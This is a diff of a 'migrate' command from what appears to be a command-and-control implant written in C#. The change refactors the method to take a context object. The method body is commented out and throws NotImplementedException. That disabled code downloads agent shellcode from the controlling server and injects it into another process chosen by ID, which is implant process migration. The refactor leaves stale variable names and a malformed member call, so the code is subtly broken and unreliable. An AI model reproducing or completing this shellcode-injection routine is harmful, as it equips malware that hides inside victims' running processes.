@@ -15,12 +15,12 @@ namespace Agent.Commands
     {
         public override string Name => "migrate";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             throw new NotImplementedException();
             /*if (task.SplittedArgs.Length < 1)
             {
-                result.Result = $"Usage: {this.Name} ProcessId";
+                context.Result.Result = $"Usage: {this.Name} ProcessId";
                 return;
             }
 
@@ -29,28 +29,28 @@ namespace Agent.Commands
             var process = Process.GetProcessById(processId);
             if (process == null)
             {
-                result.Result = $"Unable to fin process with Id {processId}";
+                context.Result.Result = $"Unable to fin process with Id {processId}";
                 return;
             }
 
 
             bool x64 = ListProcessCommand.Is64bitProcess(process);
 
-            result.Result += $"Target Process is {(x64 ? "x64" : "x86")}, downloading appropriate shellcode..." + Environment.NewLine;
+            context.Result.Result += $"Target Process is {(x64 ? "x64" : "x86")}, downloading appropriate shellcode..." + Environment.NewLine;
 
-            var shellcode =  commm.DownloadAgentBin(!x64).Result;
+            var shellcode =  context.MessageServiceDownloadAgentBin(!x64).Result;
 
             this.Notify(result, commm, $"Shellcode Downloaded");
 
-            result.Result += $"Injecting {(x64 ? "x64" : "x86")} shellcode..." + Environment.NewLine;
+            context.Result.Result += $"Injecting {(x64 ? "x64" : "x86")} shellcode..." + Environment.NewLine;
             var injectRes = Injector.Inject(process, shellcode, false);
             if (!injectRes.Succeed)
-                result.Result += $"Migration failed : {injectRes.Error}";
+                context.Result.Result += $"Migration failed : {injectRes.Error}";
             else
             {
-                result.Result += $"Migration succeed!" + Environment.NewLine;
+                context.Result.Result += $"Migration succeed!" + Environment.NewLine;
                 if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
+                    context.Result.Result += injectRes.Output;
             }*/
         }
     }
